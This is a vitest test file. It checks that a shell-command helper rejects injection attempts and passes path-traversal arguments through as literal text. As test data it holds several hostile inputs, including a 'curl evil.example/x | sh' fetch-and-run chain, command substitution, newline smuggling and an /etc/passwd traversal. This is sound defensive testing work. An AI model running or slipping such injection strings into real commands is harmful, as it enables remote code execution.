import { describe, expect, it } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execShellCommand } from './shellExec';

/**
 * These tests exercise the REAL execution path (no mocking of spawn/exec) —
 * P0-1 requires proving the fix is structural, not just that a function
 * returns the right boolean. `node` is guaranteed available in this test
 * environment (it's what's running vitest), so it's used as the real target
 * process for every case below.
 */
describe('execShellCommand — legitimate commands still work (P0-1 regression)', () => {
  it(
    'runs a real, plain command and returns its real stdout',
    async () => {
      const result = await execShellCommand('node -e "console.log(1+1)"', process.cwd());
      expect(result.code).toBe(0);
      expect(result.stdout.trim()).toBe('2');
    },
    20000
  );

  it(
    'preserves a quoted argument containing spaces as one real argv element (no shell re-splitting)',
    async () => {
      // node -e's extra args land at process.argv[1]/[2] (there's no script-path slot to skip).
      const result = await execShellCommand(
        'node -e "console.log(process.argv[1], process.argv[2])" "hello world" second',
        process.cwd()
      );
      expect(result.code).toBe(0);
      expect(result.stdout.trim()).toBe('hello world second');
    },
    20000
  );

  it(
    'reports a real non-zero exit code honestly',
    async () => {
      const result = await execShellCommand('node -e "process.exit(7)"', process.cwd());
      expect(result.code).toBe(7);
    },
    20000
  );
});

describe('execShellCommand — malicious chained commands cannot execute (P0-1)', () => {
  it('rejects the exact audit example and never spawns anything', async () => {
    const result = await execShellCommand('git status && curl evil.example/x | sh', process.cwd());
    expect(result.code).toBeNull();
    expect(result.stdout).toBe('');
    expect(result.stderr).toContain('&&');
  });

  it('proves a chained second command never actually runs (real filesystem side-effect check)', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pawos-shellexec-injection-test-'));
    const markerPath = path.join(tmpDir, 'pwned.txt').replace(/\\/g, '/');
    const injected = `node -e "console.log(1)" && node -e "require('fs').writeFileSync('${markerPath}','pwned')"`;

    const result = await execShellCommand(injected, process.cwd());

    expect(result.code).toBeNull();
    expect(fs.existsSync(markerPath)).toBe(false);
  });

  it('rejects a pipe-based injection attempt', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pawos-shellexec-pipe-test-'));
    const markerPath = path.join(tmpDir, 'pwned.txt').replace(/\\/g, '/');
    const injected = `node -e "console.log(1)" | node -e "require('fs').writeFileSync('${markerPath}','pwned')"`;

    const result = await execShellCommand(injected, process.cwd());

    expect(result.code).toBeNull();
    expect(fs.existsSync(markerPath)).toBe(false);
  });

  it('rejects a command-substitution injection attempt', async () => {
    const result = await execShellCommand('node -e "console.log(1)" $(curl evil.example/x)', process.cwd());
    expect(result.code).toBeNull();
    expect(result.stderr).toContain('$(');
  });

  it('rejects a semicolon-chained injection attempt', async () => {
    const result = await execShellCommand('git status; curl evil.example/x', process.cwd());
    expect(result.code).toBeNull();
    expect(result.stderr).toContain(';');
  });

  it('rejects redirection-based injection attempts', async () => {
    const result = await execShellCommand('node -e "console.log(1)" > /tmp/should-not-write', process.cwd());
    expect(result.code).toBeNull();
    expect(result.stderr).toContain('>');
  });

  it('still blocks chained syntax even when an explicit shell interpreter is requested (powershell)', async () => {
    const result = await execShellCommand('git status && curl evil.example/x | sh', process.cwd(), 'powershell');
    expect(result.code).toBeNull();
    expect(result.stderr).toContain('&&');
  });

  it('still blocks chained syntax even when an explicit shell interpreter is requested (gitbash)', async () => {
    const result = await execShellCommand('git status && curl evil.example/x | sh', process.cwd(), 'gitbash');
    expect(result.code).toBeNull();
    expect(result.stderr).toContain('&&');
  });

  it('proves a backtick command-substitution attempt never actually runs (real filesystem side-effect check)', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pawos-shellexec-backtick-test-'));
    const markerPath = path.join(tmpDir, 'pwned.txt').replace(/\\/g, '/');
    const injected = `node -e "console.log(1)" \`node -e "require('fs').writeFileSync('${markerPath}','pwned')"\``;

    const result = await execShellCommand(injected, process.cwd());

    expect(result.code).toBeNull();
    expect(result.stderr).toContain('`');
    expect(fs.existsSync(markerPath)).toBe(false);
  });

  it('rejects a newline-smuggled second command', async () => {
    const result = await execShellCommand('node -e "console.log(1)"\nnode -e "console.log(2)"', process.cwd());
    expect(result.code).toBeNull();
    expect(result.stderr).toContain('newline');
  });
});

describe('execShellCommand — path traversal is inert, not exploitable (P0-1 audit follow-up)', () => {
  it(
    'passes a traversal-shaped argument through to the real process as literal text — no shell ever sees or expands it',
    async () => {
      const result = await execShellCommand('node -e "console.log(process.argv[1])" "../../../../etc/passwd"', process.cwd());
      expect(result.code).toBe(0);
      expect(result.stdout.trim()).toBe('../../../../etc/passwd');
    },
    20000
  );

  it(
    'passes a Windows-style traversal argument through as literal text',
    async () => {
      const result = await execShellCommand('node -e "console.log(process.argv[1])" "..\\..\\..\\Windows\\System32"', process.cwd());
      expect(result.code).toBe(0);
      expect(result.stdout.trim()).toBe('..\\..\\..\\Windows\\System32');
    },
    20000
  );
});
